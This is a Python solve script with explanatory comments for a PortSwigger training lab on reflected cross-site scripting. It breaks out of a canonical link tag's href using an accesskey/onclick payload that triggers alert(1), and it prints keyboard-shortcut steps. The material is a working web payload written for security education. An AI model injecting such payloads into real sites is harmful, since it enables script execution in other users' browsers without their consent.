# Lab 20 — Reflected XSS in canonical link tag
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
#
# Vulnerability: Canonical <link> tag reflects the full request URL
# Aim:           Inject an attribute that calls alert when a key combo is pressed
#
# Technique:
#   The page source includes:
#     <link rel="canonical" href="https://TARGET/PATH"/>
#   The full URL (including query string) is reflected in href.
#   Injecting single quotes breaks out of the href value and adds new attributes:
#
#     URL: /?'accesskey='x'onclick='alert(1)
#     Result: <link rel="canonical" href="https://TARGET/?'accesskey='x'onclick='alert(1)'"/>
#
#   accesskey="x" binds Alt+Shift+X (Win) or Ctrl+Option+X (Mac) to the element.
#   When pressed, onclick fires → alert(1).
#
#   This is a niche injection point — <link> is in <head>, not visible.
#   Useful when all body-context injections are blocked.
#
# ⚠  Requires user to press a key combo — note this in severity rating.
#
# Usage: python xss_lab20.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The single quotes in the URL inject into the href attribute
INJECT = "'accesskey='x'onclick='alert(1)"

if __name__ == "__main__":
    banner()
    section("LAB 20 — REFLECTED XSS: CANONICAL LINK TAG (accesskey)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab20.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    session = make_session(proxies)

    # Build the URL with the injected path segment
    # requests will URL-encode this — we use a raw string to avoid double-encoding
    crafted_url = f"{base_url}/?{INJECT}"

    print(f"  ➜  Injecting into canonical link: {INJECT}\n")
    r = session.get(crafted_url)

    # Look for our injected attributes in the canonical link tag
    if "accesskey=" in r.text and "onclick=" in r.text:
        print("  ✔  Injection appears in canonical link tag")
    else:
        print("  ?  Check the page source manually — URL encoding may have altered injection")

    print()
    print("  ➜  Open this URL in a browser:")
    print(f"     {crafted_url}")
    print("  ➜  Then press: Alt+Shift+X (Windows/Linux) or Ctrl+Option+X (Mac)")
    print("  ℹ  accesskey binds a keyboard shortcut to the element → onclick fires.")
